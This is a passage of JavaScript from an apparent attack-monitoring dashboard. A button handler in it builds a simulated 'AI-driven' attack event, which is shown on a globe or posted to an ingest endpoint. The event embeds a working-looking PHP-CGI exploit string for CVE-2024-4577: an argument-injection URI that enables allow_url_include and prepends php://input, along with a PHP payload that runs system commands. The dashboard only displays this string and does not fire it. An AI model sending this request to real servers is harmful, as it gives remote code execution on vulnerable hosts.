});

document.getElementById('ai-filter-select')?.addEventListener('change', (e) => {
  aiFilterMode = e.target.value;
  renderAttackTable();
});

document.getElementById('btn-simulate-attack')?.addEventListener('click', async () => {
  const aiPayload = {
    sourceIp: '185.220.101.77',
    originCountry: 'Autonomous AI Node',
    originCode: 'RU',
    originCity: 'Moscow-Cluster',
    originAsn: 'AS60729 LLM-Swarm',
    srcLat: 55.7558,
    srcLng: 37.6173,
    destCity: 'São Paulo',
    destCountry: 'Brazil',
    destCode: 'BR',
    destLat: -23.5505,
    destLng: -46.6333,
    category: 'RCE',
    severity: 'CRITICAL',
    cve: 'CVE-2024-4577',
    isAiDriven: true,
    aiType: 'Agente LLM Autônomo (Polymorphic Zero-Day)',
    aiConfidence: 99,
    attackName: '[DISPARO IA AO VIVO] PHP-CGI Polymorphic Exploit Chain',
    targetStack: 'PHP 8.3 CGI',
    method: 'POST',
    uri: '/cgi-bin/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input',
    payload: '<?php /* AI-MUTATED-SIGNATURE-9981 */ system("id; uname -a"); ?>'
  };

  if (standaloneRunning) {
    const evt = buildStandaloneEvent(aiPayload);
    standaloneTotalCounter += 5;
    processIncomingEvent(evt, standaloneTotalCounter, yearlyHistoryData[yearlyHistoryData.length - 1], monthlyEscalationData[monthlyEscalationData.length - 1]);
  } else {
    await fetch('/api/ingest', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(aiPayload)
    });
  }

  world.pointOfView({ lat: aiPayload.destLat, lng: aiPayload.destLng, altitude: 1.65 }, 900);
});

